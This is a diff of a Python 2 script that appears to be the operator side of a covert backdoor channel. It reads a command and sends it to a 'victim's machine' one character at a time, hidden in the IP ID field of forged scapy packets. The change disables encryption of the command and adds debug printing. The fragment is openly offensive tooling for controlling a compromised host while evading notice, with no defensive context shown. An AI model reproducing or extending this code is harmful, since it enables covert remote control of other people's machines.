@@ -23,7 +23,7 @@ def main():
 	# get command	
 	cmd = raw_input("# ")
 	# encrypt the command before sending it to victim's machine
-	enc_cmd = encrypt(cmd, pw)
+	#enc_cmd = encrypt(cmd, pw)
 
 	# send to victim using scapy
 	# how to put random data on each field
@@ -32,16 +32,17 @@ def main():
 	mypacket.src = srcIp
 	mypacket.dst = desIp
 
-	print enc_cmd
-
-	for c in enc_cmd:
+	#print enc_cmd
+	i = 0
+	for c in cmd:
 		mypacket.id = ord(c)	# ascii to int  ( opposite: str(unichr(97))  )
-
+		print "#", i
+		i = i + 1
 		# send forged packet
 		send(mypacket)
 
 	# recv the result
-	
+
 
 if __name__ == '__main__':
 	try:
